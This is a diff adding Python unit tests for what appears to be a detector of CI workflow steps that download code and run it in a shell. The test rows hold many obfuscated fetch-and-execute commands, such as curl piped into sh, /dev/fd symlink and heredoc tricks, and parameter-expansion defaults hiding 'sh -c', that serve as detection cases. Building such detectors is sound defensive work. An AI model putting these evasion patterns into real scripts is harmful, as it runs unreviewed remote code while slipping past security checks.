+        rows += ["curl -fsSLo \"$D/3\" %stool\n" % URL + move + "\nsh" + self.HARMLESS % "3"
+                 for move in ("(cd /dev/fd)", "if false; then cd /dev/fd; fi", "f() { cd /dev/fd; }", "cd /dev/fd | cat")]
+        for row in rows:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "echo done\n", shell))
+        # The controls, as `main` reads them: no record at all; a harmless program down the pipe; and
+        # a body that is the program where the record is all that reaches it (round 1's closure).
+        self.assertTrue(reported(self.PRINTED + "sh" + self.HARMLESS % "/dev/stdin"))
+        self.assertFalse(reported(links[1] % "/dev/stdin" + "\necho 'echo hi' | sh" + self.HARMLESS % "/dev/stdin"))
+        self.assertTrue(reported("ln -s /dev/fd/3 x\nsh 3<<'EOF' <x\n%s\nEOF\n" % PIPE))
+
+    def test_a_check_is_not_credited_with_a_body_a_record_may_add(self):
+        # The seat's HB rows: a check that reads a list `main` does not know, beside a list on fd 3 a
+        # link the shell never makes may give it. Round 2 credited the check with that list (CCCRR);
+        # `main` reports the run in every setting, and so does the fold that reads `main`'s body
+        # (by the seat's truth the step stops in the three it cleared: `main`'s own price, kept).
+        check = "\n" + GET + "sha256sum -c 3<<'EOF' 4<<'END' <sums\n%s  tool\nEOF\necho hi\nEND\nsh tool\n" % ("a" * 64)
+        for link in ("ln -s /dev/fd/3 sums || true", "if false; then ln -s /dev/fd/3 sums; fi", "true"):
+            for shell in SHELLS:
+                with self.subTest(link=link, shell=shell):
+                    self.assertTrue(reported(link + check, shell))
+
+    def test_the_operands_own_body_is_read_and_a_records_beside_it(self):
+        # The seat's B1x12 and B1x13: the operand names a descriptor that holds a body, and a link the
+        # shell never makes says it is another. The operand's own body is `main`'s reading, read
+        # first and in every fold `main` reads; the other is one more reading, so a program in
+        # either reports -- in the second a price, where the link is never made (the seat's truth
+        # for B1x13: no parent runs it) -- and with no link each reads by its own body alone.
+        both = "sh 3<<'EOF' 4<<'END' </dev/fd/3\n%s\nEOF\n%s\nEND\n"
+        link = "true || ln -s /dev/fd/4 /dev/fd/3\n"
+        for own, other, linked, plain in ((PIPE, "echo hi", True, True), ("echo hi", PIPE, True, False),
+                                         ("echo hi", "echo ho", False, False)):
+            for shell in SHELLS:
+                with self.subTest(own=own, other=other, shell=shell):
+                    self.assertEqual(linked, reported(link + both % (own, other), shell))
+                    self.assertEqual(plain, reported(both % (own, other), shell))
+
+    def test_each_body_a_record_may_add_is_read_in_a_fold_of_its_own(self):
+        # A name linked twice may be either target, so the body on each is a reading, each read in
+        # its turn: round 2 read the first alone, and CLEAN where the second is the program.
+        two = "ln -s /dev/fd/3 x\nln -sf /dev/fd/4 x\nsh 3<<'EOF' 4<<'END' <x\n%s\nEOF\n%s\nEND\n"
+        three = "ln -s /dev/fd/3 x\nln -sf /dev/fd/4 x\nln -sf /dev/fd/5 x\nsh 3<<'A' 4<<'B' 5<<'C' <x\n%s\nA\n%s\nB\n%s\nC\n"
+        for row, runs in ((two % (PIPE, "echo hi"), True), (two % ("echo hi", PIPE), True), (two % ("echo hi", "echo ho"), False),
+                          (three % ("echo hi", "echo ho", PIPE), True), (three % ("echo hi", PIPE, "echo ho"), True),
+                          (three % ("echo a", "echo b", "echo c"), False)):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertEqual(runs, reported(row, shell))
+
+    def test_a_name_given_two_targets_may_be_either_and_carries_every_file_held(self):
+        # The round-2 seat's `reached-FIRST-target` and `carrier-one-recorded`, each of which passed
+        # its suite: EVERY target a name is given is read, not the first alone, and where they are
+        # two descriptors every file held is carried, not the first target's alone. The download is
+        # held on fd 4, the name's last target here, which is the one the shell opens: each row runs.
+        held = "\nsh 3<> /dev/null 4<> tool 5<> /dev/null <x 3<&- 4<&- 5<&-\n"
+        for links in ("ln -s /dev/fd/3 x\nln -sf /dev/fd/4 x", "ln -s /dev/fd/3 x\nln -sf /dev/fd/5 x\nln -sf /dev/fd/4 x"):
+            for shell in SHELLS:
+                with self.subTest(links=links, shell=shell):
+                    self.assertTrue(reported(GET + links + held, shell))
+        # One descriptor, however often named, carries that one alone: fd 3 and fd 5 hold no download.
+        for links in ("ln -s /dev/fd/3 x\nln -sf /dev/fd/3 x", "ln -s /dev/fd/5 x", "ln -s /dev/fd/5 x\nln -sf /dev/fd/5 x"):
+            with self.subTest(links=links):
+                self.assertFalse(reported(GET + links + held))
+
+    def test_past_the_cap_a_record_may_put_any_body_held_there(self):
+        # B2, the seat's CAPX-H16, -H40, -LH17 and -LH40: past `_PLACES` places or targets the word
+        # reaches every file held, and every BODY held too -- round 2 named none, so the body on the
+        # descriptor the step's own `cd` or last link reaches read CLEAN while every parent runs it.
+        # At the cap it is read by its own path, as round 2 read it; a harmless body reads CLEAN.
+        import shell_command
+        cap = shell_command._PLACES
+        self.assertEqual(16, cap)       # by number: the rows below are counted from it (the seat's `places-15`, `-17`)
+        body = "\n%s\nEOF\n"
+        for extra in (cap - 1, cap, cap + 24):
+            moves = "cd /dev/fd\n" + "".join("(cd /d%d)\n" % n for n in range(extra)) + "sh 3<<'EOF' <3"
+            links = "".join("ln -sf /t%d x\n" % n for n in range(extra)) + "ln -sf /dev/fd/3 x\nsh 3<<'EOF' <x"
+            for row in (moves, links):
+                for shell in SHELLS:
+                    with self.subTest(extra=extra, row=row[-20:], shell=shell):
+                        self.assertTrue(reported(row + body % PIPE, shell))
+                        self.assertFalse(reported(row + body % "echo hi", shell))
+        # Any body held, but few of them: each is one more reading of the whole job, on top of every
+        # fold `main` reads, so the folds read at most `_BODY_FOLDS` others -- each in a fold of its
+        # own and by what it holds -- and one more is a step the reader refuses, reported whole, a
+        # harmless one too: never read CLEAN (the coordinator's ruling on the cost of the folds).
+        # The step stands in `/dev`, which the subshells' `cd`s push out of what the reader keeps: with
+        # the program on descriptor 3, the one `<fd/3` opens, a parent runs it under every setting but
+        # `sh` (truth `--RR-RRR`: those `cd`s fail, which stops bash 5.2 and dash under `-e`).
+        past = "cd /dev\n" + "".join("(cd /d%d)\n" % n for n in range(cap)) + "sh %s <fd/3%s\n"
+        folds = shell_command._BODY_FOLDS
+        self.assertEqual(4, folds)      # by number: twice what a step that holds any holds
+
+        def held(count, program=None):
+            """`count` bodies on descriptors 3 up, the `program`-th a program and the others harmless."""
+            heads = " ".join("%d<<'E%d'" % (fd, fd) for fd in range(3, 3 + count))
+            return past % (heads, "".join("\n%s\nE%d" % (PIPE if fd - 2 == program else "echo %d" % fd, fd)
+                                          for fd in range(3, 3 + count)))
+        for count in range(1, folds + 1):
+            self.assertFalse(reported(held(count)))
+            for program in range(1, count + 1):
+                with self.subTest(count=count, program=program):
+                    self.assertTrue(reported(held(count, program)))
+        for count in (folds + 1, cap, cap + 1):
+            for program in (None, 1, count):
+                with self.subTest(count=count, program=program):
+                    found = wg.job_defects([wg.Step("step", held(count, program), None)])
+                    self.assertIn("may put more than %d bodies on one descriptor" % folds, " ".join(why for _name, why in found))
+
+    def test_each_way_the_reader_reads_a_record_has_its_row(self):
+        # B3 (the round-2 seat: surviving mutants that re-open a row): each of these readings was right
+        # at round 2's head and unpinned, so dropping it re-opened a row and passed these tests. A
+        # record is read through what `command()` strips in front of it -- a wrapper, an assignment, a
+        # keyword -- and with `ln` named by its path; a target that ends in `/` names its link by its
+        # last part; a link's name is read in its normal form; `pushd` moves as `cd` does (the seat's
+        # EK06); and a relative `cd` stands below EACH place the step may be in, not the latest alone.
+        held, moved = "\nsh 3<> tool <%s 3<&-", "\nsh 3<> /tmp/tool <%s 3<&-"
+        get = "curl -fsSLo /tmp/tool %stool\n" % URL
+        rows = [GET + link + held % "x" for link in (
+            "sudo ln -s /dev/fd/3 x", "env ln -s /dev/fd/3 x", "command ln -s /dev/fd/3 x", "nice ln -s /dev/fd/3 x",
+            "LC_ALL=C ln -s /dev/fd/3 x", "if ln -s /dev/fd/3 x; then echo linked; fi", "! ln -s /dev/fd/3 x",
+            "/bin/ln -s /dev/fd/3 x", "/usr/bin/ln -sf /dev/fd/3 x", "sudo /bin/ln -s /dev/fd/3 x",
+            "ln -s /dev/fd/3 ./x", "ln -s /dev/fd/3 .//x")]
+        rows += [GET + "ln -s /dev/fd/" + held % "fd/3", GET + "ln -s /dev/" + held % "dev/fd/3",
+                 GET + "ln -s /dev/fd ./fds" + held % "fds/3"]
+        rows += [get + move + moved % "fd/3" for move in (
+            "command cd /dev", "CDPATH= cd /dev", "if cd /dev; then echo moved; fi", "pushd /dev", "pushd /dev > /dev/null",
+            "cd /\n(cd /tmp)\ncd dev", "cd /\nif false; then cd /tmp; fi\ncd dev")]
+        for row in rows:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        # The pipe is the reader's past the cap too (the seat's CAPX-P16, -P40, -LP17 and -LP40, which
+        # every parent runs): a word that reaches more than the reader keeps may be the pipe's path.
+        import shell_command
+        cap, stream = shell_command._PLACES, "curl -fsSL %si.sh | sh <%%s\n" % URL
+        self.assertEqual(16, cap)
+        for extra in (cap - 1, cap, cap + 24):
+            moves = "cd /dev\n" + "".join("(cd /d%d)\n" % n for n in range(extra))
+            links = "".join("ln -sf /t%d x\n" % n for n in range(extra)) + "ln -sf /dev/stdin x\n"
+            for shell in SHELLS:
+                with self.subTest(extra=extra, shell=shell):
+                    self.assertTrue(reported(moves + stream % "stdin", shell))
+                    self.assertTrue(reported(links + stream % "x", shell))
+                    self.assertFalse(reported(moves + "sh <stdin\n", shell))
+        # And what each reading must NOT take in, CLEAN as `main` reads it: a name that only starts
+        # like a linked one; two paths that agree on one descriptor, which carry that one alone and
+        # not every file held; `/proc/self/fd/N` reached by a link, the one descriptor it names; a
+        # here-string's text a value decides, which is no path and carries nothing; and exactly
+        # `_PLACES` places, all kept -- one more and the oldest is any place, every file held.
+        for row in (GET + "ln -s /dev/fd/3 x" + held % "xy", GET + "ln -s /dev/fd x" + held % "xy/3",
+                    GET + "sh -c 'echo hi' 3<> tool <<< \"$X\" 3<&-",
+                    GET + "ln -s /dev/fd/3 x\nln -sf /dev/fd/3 x\nsh 3<> /dev/null 4<> tool <x 3<&- 4<&-",
+                    GET + "ln -s /proc/self/fd p\nsh 3<> /dev/null 4<> tool <p/3 3<&- 4<&-",
+                    get + "".join("(cd /d%d)\n" % n for n in range(cap)) + "sh 3<> /tmp/tool <fd/9 3<&-"):
+            for shell in SHELLS:
+                with self.subTest(row=row[-60:], shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+        self.assertTrue(reported(get + "".join("(cd /d%d)\n" % n for n in range(cap + 1)) + "sh 3<> /tmp/tool <fd/9 3<&-\n"))
+        # Nor these two (the round-2 seat's `sources-first-repeated` and `sources-cap-no-dedupe`, which
+        # passed its suite): a path that names descriptor 3 as written, and again from where a `cd`
+        # put the step, is 3 alone, not every file held; and a path a value decides, below a name
+        # with more targets than the reader keeps, is every file held as written and so no body, as
+        # `main` reads it -- the body behind a path a value decides is `main`'s to read, and the PR
+        # that reads it there moves this row.
+        for row in (get + "cd /\nsh 3<> /dev/null 4<> /tmp/tool <../dev/fd/3 3<&- 4<&-",
+                    "".join("ln -sf /t%d x\n" % n for n in range(cap + 1)) + "sh 3<<'EOF' <x/$N\n%s\nEOF" % PIPE):
+            for shell in SHELLS:
+                with self.subTest(row=row[-60:], shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+    def test_a_find_action_reads_the_body_a_record_put_there(self):
+        # The fold onto #2935. `folds` reads each body a record may add with every `find` the `find`
+        # and then with each action in its place: the product of the two, not their sum. A shell
+        # that an action runs, reading a body through a link or a `cd`, needs both readings at
+        # once -- `main` with #2935 reads the action and no body there, and this PR by itself read
+        # the body and the `find` -- so each of these read CLEAN on both and reports only folded.
+        body = " 3<<'EOF' <%s\n%s\nEOF\n"
+        for use in ("ln -s /dev/fd/3 x\nfind /dev/null -exec sh \\;" + body % ("x", PIPE),
+                    "cd /dev\nfind /dev/null -exec sh \\;" + body % ("fd/3", PIPE),
+                    "ln -s /dev/fd/3 x\nfind /dev/null -exec true \\; -exec sh \\;" + body % ("x", PIPE)):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(use, shell))
+        self.assertFalse(reported("ln -s /dev/fd/3 x\nfind /dev/null -exec sh \\;" + body % ("x", "echo hi")))
+
+    def test_the_folds_read_mains_body_first_then_each_a_record_adds(self):
+        import shell_command
+        one, two, own = ("a", False, True), ("b", False, True), ("own", False, True)
+
+        def read(bodies, reached):
+            """What `body_read` answers in each fold `folds` makes for it."""
+            return [shell_command.body_read(bodies, reached) for _sure in shell_command.folds(lambda: False)]
+        # `main`'s reading first -- the body the operand names as written, or none -- then each other
+        # body a record reaches, once: on a descriptor it names, or on any (`?`).
+        self.assertEqual([None], read({"3": one}, (None,)))
+        self.assertEqual([one], read({"3": one}, ("3",)))
+        self.assertEqual([None, one], read({"3": one}, (None, "3")))
+        self.assertEqual([None, one, two], read({"3": one, "4": two}, (None, "3", "4")))
+        self.assertEqual([None, one, two], read({"3": one, "4": two}, (None, "?")))
+        self.assertEqual([own, one], read({"0": own, "3": one, "4": own}, ("0", "3", "4")))
+        self.assertEqual([None], read({"3": one}, ("?",)))            # a source a value decides: as `main` reads it
+        self.assertEqual([None], read({"3": one}, (None, "5")))       # a descriptor that holds none
+        # Outside the folds, and after folds that read a record's body, `main`'s.
+        self.assertEqual([None, one, two], read({"3": one, "4": two}, (None, "4", "3")))
+        self.assertEqual({"at": 0, "more": False}, shell_command._BODIES)
+        self.assertIsNone(shell_command.body_read({"3": one}, (None, "3")))
+        # More than the reader keeps: `main`'s, then a step it refuses.
+        many = {str(fd): ("body %d" % fd, False, True) for fd in range(3, 4 + shell_command._BODY_FOLDS)}
+        folds = shell_command.folds(lambda: False)
+        next(folds)
+        self.assertIsNone(shell_command.body_read(many, (None, "?")))
+        next(folds)
+        with self.assertRaises(shell_lex.Unreadable):
+            shell_command.body_read(many, (None, "?"))
+        folds.close()
+        # The record's folds follow ALL of `main`'s -- every set of the words bash may make empty
+        # (#2929), every action of a `find` -- and read each of those again.
+        seen = []
+
+        def unsure():
+            seen.append((shell_command._BODIES["at"], shell_command._HALVES["empty"] is shell_command._ALL,
+                         shell_command._ACTIONS["at"]))
+            shell_command._HALVES["both"] = True
+            shell_command._ACTIONS["more"] = shell_command._ACTIONS["at"] < 1
+            shell_command.body_read({"3": one}, (None, "3"))
+            return False
+        list(shell_command.folds(unsure))
+        self.assertEqual([(body, empty, at) for body in (0, 1) for empty in (False, True) for at in (0, 1)], seen)
+        # And the stage the reader hands on: `main`'s body in `main`'s folds, the record's in its own;
+        # only what fd 0 reads differs, so a string kept parsed across folds (`workflow_programs._parsed`,
+        # read for its argv alone) is the same in each.
+        text = "ln -s /dev/fd/3 /dev/stdin\necho x | sh 3<<'EOF' </dev/stdin\necho hi\nEOF\n"
+        stages = [shell_reader.statements(text)[-1].stages[-1] for _sure in shell_command.folds(lambda: False)]
+        self.assertEqual([None, ("echo hi", False)], [stage.stdin_heredoc for stage in stages])
+        self.assertEqual([stages[0]._replace(heredoc=None, stdin_heredoc=None)] * 2,
+                         [stage._replace(heredoc=None, stdin_heredoc=None) for stage in stages])
+
+class TestEachGateOfTheWholeWordHasAVerdict(unittest.TestCase):
+    """PR #2856 round 9, the round-8 verdict's F4: each test that confines the whole reading to a
+    command word moves a verdict, so each has a row here. Read whole past one, the guard reports
+    where nothing runs: `$$${X:-…}` glues the PID to the word, so no word starts at the `${` (the
+    word test); `${X:-bash -s;}` holds an operator, where `main` ends the statement (the scan's
+    stop); and the `case` subject `${a:-$${b} x}` under `sh`, where dash ends it at its first `}`
+    and rejects the line (q28: bash 3.2 reads one word and runs the arm; the `case` test).
+    A function body on its header's line was the head test's row, read as past every command's
+    head and CLEAN, until #2954: its first word is a command word, the gate that kept CPH15 and
+    CPP14 CLEAN hid the rows a parent runs, and both are read whole and reported though no parent
+    runs them (`HEADED`: the coordinator's ruling of 2026-10-09, quoted in #2954's PR; the price
+    beside their twins in `RUNS`, as `main` reads the two with a plain `bash -s`). The head test
+    keeps its unit rows (`test_shell_reader`'s `test_only_a_command_word_is_read_whole`).
+    And where the round-7 ruling reads a word as `main` does -- a `case` subject, a `${…}` that
+    spans a line -- every shell runs the payload, and `main` and the head read it CLEAN (h22,
+    CSH19, CSP19: RRRRRRRR); a gate that read them whole would close them, which the ruling
+    leaves to their own fix."""
+
+    OVER = ("$$${X:-bash -s} <<'EOF'\ncurl -fsSL %si.sh | sh\nEOF" % URL,             # PDH02 --------
+            "curl -fsSL %si.sh | $$${X:-bash -s}" % URL,                            # PDP02 ffffffff
+            "${X:-bash -s;} <<'EOF'\ncurl -fsSL %si.sh | sh\nEOF" % URL,            # CSH20 --------
+            "curl -fsSL %si.sh | ${SH:-bash -s;}" % URL)                            # CSP20 ffffffff
+    # #2954 moves these two from `OVER`, CLEAN, to REPORT under every setting: 10 cells, and no parent
+    # runs either (the call is the heredoc's first line; the definition is lost in the pipeline).
+    HEADED = ("function f { ${X:-bash -s} <<'EOF'; }\nf\ncurl -fsSL %si.sh | sh\nEOF" % URL,  # CPH15 --------
+              "curl -fsSL %si.sh | f() { ${SH:-bash -s}; }\nf" % URL)                 # CPP14 ffffffff
+    # Their twins, which `main` read CLEAN: CPH15 with the call behind the heredoc (RRRR-RR-, dash
+    # refusing `function`), and a definition behind a pipe that `lastpipe` keeps (RRfffRff: bash 5).
+    RUNS = ("function f { ${X:-bash -s} <<'EOF'; }\ncurl -fsSL %si.sh | sh\nEOF\nf" % URL,
+            "curl -fsSLo t %st\nshopt -s lastpipe\ntrue | f() { ${Y:+/usr/bin/env true} sh t; }\nf" % URL)
+    CASE = GET + "case ${a:-$${b} x} in *) sh tool;; esac"                          # q28 ffRRffRf
+    RULED = (GET + "case ${X:-a b} in *) sh tool;; esac",                           # h22
+             "${X:-bash\n-s} <<'EOF'\ncurl -fsSL %si.sh | sh\nEOF" % URL,          # CSH19
+             "curl -fsSL %si.sh | ${SH:-bash\n-s}" % URL)                           # CSP19
+
+    def test_past_each_gate_nothing_runs_and_nothing_is_reported(self):
+        for row in self.OVER:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+        for shell in ("sh", "sh {0}"):          # dash runs nothing; bash 3.2 runs the payload
+            with self.subTest(row=self.CASE, shell=shell):
+                self.assertFalse(reported(self.CASE + "\necho done\n", shell))
+
+    def test_a_body_on_its_headers_line_is_read_whole_and_reported(self):
+        for row in self.HEADED:                 # the price: no parent runs them
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        for row in self.RUNS:                   # a bash parent runs each
+            for shell in (None, "bash", "bash {0}"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_word_the_ruling_leaves_to_main_reads_as_main(self):
+        for row in self.RULED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+
+class TestAnAnsiCWordInsideTheDefaultIsBashsText(unittest.TestCase):
+    """PR #2856 round 9, the round-8 verdict's B2: inside a command word read whole, `$'-c'` is the
+    text bash makes of it, so `${X:-sh $'-c' '…'}` is `sh -c` running the string (PCX03: RRRR-RR-,
+    bash runs the payload and dash, which has no `$'…'`, runs nothing)."""
+
+    def test_the_decoded_flag_runs_its_string_under_bash(self):
+        row = "${X:-sh $'-c' 'curl -fsSL %si.sh | sh'}" % URL
+        for shell in (None, "bash", "bash {0}"):
+            with self.subTest(shell=shell):
+                self.assertTrue(reported(row + "\necho done\n", shell))
+
+
+class TestAWholeDefaultNamingAKnownCommandIsThatCommand(unittest.TestCase):
+    """PR #2856 round 10, the round-9 verdict's B1: a command word read whole whose default's first
+    word is a name the command layer reads -- a wrapper, a fetcher, a foreign interpreter, by path
+    too -- is that command, as `main` read it by its basename: `${X:-/usr/bin/env sh -c} '…'` runs
+    the shell, and `${X:-/usr/bin/curl -fsSL} URL | sh` pipes a download into it. Round 9 read the
+    whole word as a name it does not follow, CLEAN (721 cells, 145 rows of the seat's hunts 18, 20
+    and 22 that `main` and the base report, every shell running the payload). Only those names:
+    any other first word keeps the whole word, which the step's own values may resolve (CSV1,
+    `RUN='sh tool'` then `${RUN:-cat x}`), and so do a pattern and a substitution (GL1H, CSH17),
+    which a reading of every first word read CLEAN (the seat's 95 cells, 19 rows)."""
+
+    REPORT = ("${X:-/usr/bin/env sh -c} '%s'" % PIPE,                            # WPeC
+              "${X:-/usr/bin/nohup bash -c} '%s'" % PIPE,                        # WPhB
+              "f() {\n  ${X:-/usr/bin/env sh -c} '%s'\n}\nf" % PIPE,             # OPeF
+              "${X:-/usr/bin/env curl -fsSL} %si.sh | sh" % URL,                 # WF01
+              "${X:-/usr/bin/env -u FOO sh -c} '%s'" % PIPE,                     # WC12
+              "${X:-/usr/bin/curl -fsSL} %si.sh | sh" % URL,                     # FPa1
+              "${X:-/usr/bin/curl -fsSLo tool} %stool\nsh tool" % URL,           # FPa2
+              "${X:-/usr/bin/wget -qO-} %si.sh | sh" % URL)                      # FPd1
+    KEPT = (GET + "RUN='sh tool'\n${RUN:-cat x}",                                # CSV1
+            "${X:-/bin/[s]h -s} <<'EOF'\n%s\nEOF" % PIPE,                       # GL1H
+            "${X:-$(echo bash) -s} <<'EOF'\n%s\nEOF" % PIPE)                    # CSH17
+
+    def test_a_default_naming_a_wrapper_or_fetcher_runs_it(self):
+        for row in self.REPORT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_any_other_first_word_keeps_the_whole_word(self):
+        for row in self.KEPT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+
+class TestAWholeDefaultIsReadAsBashExpandsIt(unittest.TestCase):
+    """PR #2856 round 11, the round-10 verdict's B1: the whole word is read as bash expands it with its
+    name unset -- the default, a literal glued after the `}` joining its last word, split where bash
+    splits it, each word keeping the reader's marks -- and where `_WHOLE_DEFAULTS` does not read it,
+    `main`'s split words stay when their first names a known command by its basename. Round 10 put
+    the whole word in their place and read nothing past it (477 cells, 97 rows of the seat's hunts
+    24-32), and read the rule's words as plain strings, losing a lifted `$(…)` behind a wrapper
+    (180 cells, 36 rows). Every row here runs the payload in each setting it is pinned in."""
+
+    PIPED = "curl -fsSL %si.sh | " % URL
+    BASH = (None, "bash", "bash {0}")
+    PAST = ("${X:-$HOME/bin/env sh -c} '%s'" % PIPE,                       # V06: a `$NAME` in the default
+            "${X:-${Y:-/usr/bin/env sh -c}} '%s'" % PIPE,                  # N01: a nested default
+            "${1:-/usr/bin/env sh -c} '%s'" % PIPE,                        # R1: a parameter that is no NAME
+            "${X:-/bin/bash -c}$(echo) '%s'" % PIPE)                       # Pb-g: a substitution glued on
+    MARKED = ("${X:-/usr/bin/env `echo sh` -c} '%s'" % PIPE,               # B01
+              "${X:-/usr/bin/env $(echo sh) -c} '%s'" % PIPE,              # Pe-m
+              PIPED + "${X:-/usr/bin/env $(echo sh)}",                      # Pe-n
+              PIPED + "${X:-env $(echo sh)}")                               # en-n
+    GLUED = (PIPED + "${X:-/usr/bin/env s}h",                               # G11
+             "${X:-/usr/bin/env sh -c}x '%s'" % PIPE,                      # G01
+             "${X:-/bin/sh -c}x '%s'" % PIPE)                              # S04 (hunt 30)
+
+    def test_past_the_regex_mains_split_words_name_the_command(self):
+        for row in self.PAST:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        for shell in self.BASH:                     # R4: bash's array; dash rejects the word
+            with self.subTest(row="R4", shell=shell):
+                self.assertTrue(reported("${X[0]:-/usr/bin/env sh -c} '%s'\necho done\n" % PIPE, shell))
+
+    def test_a_lifted_substitution_stays_dynamic_behind_the_wrapper(self):
+        for row in self.MARKED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_literal_glued_after_the_brace_joins_the_last_word(self):
+        for row in self.GLUED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_process_substitution_behind_a_wrapper_is_the_shells_file(self):
+        # hunt 31's `*-r` rows: bash runs the download; dash has no `<(…)`
+        for row in ("${X:-env bash <(%s)}" % "curl -fsSL %si.sh" % URL,               # en-r
+                    "${X:-/usr/bin/env bash <(%s)}" % "curl -fsSL %si.sh" % URL):    # Pe-r
+            for shell in self.BASH:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_the_default_splits_where_bash_splits_it(self):
+        # F2: at a space, a tab or a newline, a run of them one break and none at either end (T1-T4);
+        # never at U+00A0, `\v` or U+2003 (T5, T6, T8: bash runs a command so named, and nothing runs)
+        for name, default in (("T1", "/usr/bin/env\tsh -c"), ("T2", "/usr/bin/env  sh -c"),
+                              ("T3", " /usr/bin/env sh -c"), ("T4", "/usr/bin/env sh -c ")):
+            for shell in SHELLS:
+                with self.subTest(row=name, shell=shell):
+                    self.assertTrue(reported("${X:-%s} '%s'\necho done\n" % (default, PIPE), shell))
+        for blank in (" ", "\v", " "):
+            for shell in SHELLS:
+                with self.subTest(blank=blank, shell=shell):
+                    self.assertFalse(reported("${X:-/usr/bin/env%ssh -c} '%s'\necho done\n" % (blank, PIPE), shell))
+
+    def test_a_nested_brace_leaves_mains_words(self):
+        # F4 (N12): the scan ends the word at the inner `}`, so `main`'s words stay and name `env`
+        for shell in SHELLS:
+            with self.subTest(shell=shell):
+                self.assertTrue(reported("${X:-${HOME}/bin/env sh -c} '%s'\necho done\n" % PIPE, shell))
+
+
+class TestTheRoundElevenVerdictsRows(unittest.TestCase):
+    """PR #2856 round 12, the round-11 verdict, on its seat's rows (hunts 33-44) and the #2885 round-3
+    seat's CZ rows, each pinned where its truth (the eight parents, b5e b5p b3e b3p de b5n b3n dn)
+    runs the payload, and the named readings where none does.
+    - B1: where `main`'s split words stay (past `_WHOLE_DEFAULTS`), the default's `}` comes off their
+      last word, so a default ending in its program names it (843 cells, 175 rows against round 10);
+      not where bash never expands the default (`${#:-…}`) or refuses it (`${1:=…}`), which run nothing.
+    - B2: a command word bash expands to nothing with its name unset -- `${X:+W}`, `${X+W}`, `${X#W}`,
+      `%`, `/` -- is the literal glued after its `}`, or nothing, and the next word is the command; a
+      step that sets the name runs the alternate, as before (`X=1`, `set -- 1`; `X=` for `+` alone).
+      Round 13, the round-12 ruling: no step's text decides a half -- both are read -- so the set
+      rows whose alternate runs nothing (`SET_RUNS_NOTHING`) are reported, a fail-closed over-report.
+    - B5: a check is credited with what `0<>` opened only where fd 0 still holds it and the checker
+      reads its standard input; else `0<>` is a write, as `main` reads it (56 cells, 20 rows).
+    - F1, F2: the glued literal takes no glob character; a glued `$(…)` joins the last word."""
+
+    PIPED = "curl -fsSL %si.sh | " % URL
+    BASH = (None, "bash", "bash {0}")
+    STRIPPED = (PIPED + "${X:-$HOME/bin/env sh}",                                  # hv-p RRRRRRRR
+                "${1:-/usr/bin/env sh} -c '%s'" % PIPE,                            # r1-c RRRRRRRR
+                "${1:-/usr/bin/env s}h <<'EOF'\n%s\nEOF" % PIPE,                    # W24-h RRRRRRRR
+                GET + "D=/bin\n${X:-$D/sh tool}")                                  # S1-f RRRRRRRR
+    NEVER = ("${#:-/usr/bin/env sh} -c '%s'" % PIPE,                               # W21-c --------
+             "${1:=/usr/bin/env sh} -c '%s'" % PIPE,                               # o3-c --------
+             "${1=/usr/bin/env sh} -c '%s'" % PIPE)                                # o4-c --------
+    UNSET = ("${X:+/usr/bin/env true}sh -c '%s'" % PIPE,                           # gc-c-e1 RRRRRRRR
+             PIPED + "${X:+/usr/bin/env true} sh",                                 # p-c-e1 RRRRRRRR
+             PIPED + "${X:+$HOME/bin/env true} sh",                                # p-c-hm RRRRRRRR
+             "${X:+/usr/bin/env true} sh -c '%s'" % PIPE,                          # c-c-e1 RRRRRRRR
+             PIPED + "${X#/usr/bin/env true} sh",                                  # p-h1-e1 RRRRRRRR
+             "X=\n${X:+/usr/bin/env true} sh -c '%s'" % PIPE)                      # set empty: `:+` is nothing
+    SET = ("X=1\n${X:+/usr/bin/env sh -c} '%s'" % PIPE,                            # Oa5 RRRRRRRR
+           "X=1\n" + PIPED + "${X:+$HOME/bin/env sh}",                             # Od5 RRRRRRRR
+           "X=\n${X+/usr/bin/env sh -c} '%s'" % PIPE,                              # Oa6 RRRRRRRR
+           "set -- 1\n${1:+/usr/bin/env sh} -c '%s'" % PIPE)                       # o5-c RRRRRRRR
+    SET_RUNS_NOTHING = ("X=1\n${X:+/usr/bin/env true} sh -c '%s'" % PIPE,           # c-c-set --------
+                        "X=\n${X+/usr/bin/env true} sh -c '%s'" % PIPE)             # A34 --------
+    GLUED = ("${X:-/usr/bin/env /usr/bin/ba}[s]h -s <<'EOF'\n%s\nEOF" % PIPE,       # G01p RRRRRRRR
+             PIPED + "${X:-/usr/bin/env /usr/bin/s}[h]",                           # G07p RRRRRRRR
+             "${X:-sh -c}$(echo) '%s'" % PIPE,                                     # no-sx RRRRRRRR
+             "${X:-env sh -c}`echo` '%s'" % PIPE)                                  # en-sq RRRRRRRR
+    # The CZ rows: `sums` holds a digest no download has, `self` the download's own; under `-e`
+    # a check of `sums` stops the step, one of `self` passes and the payload runs.
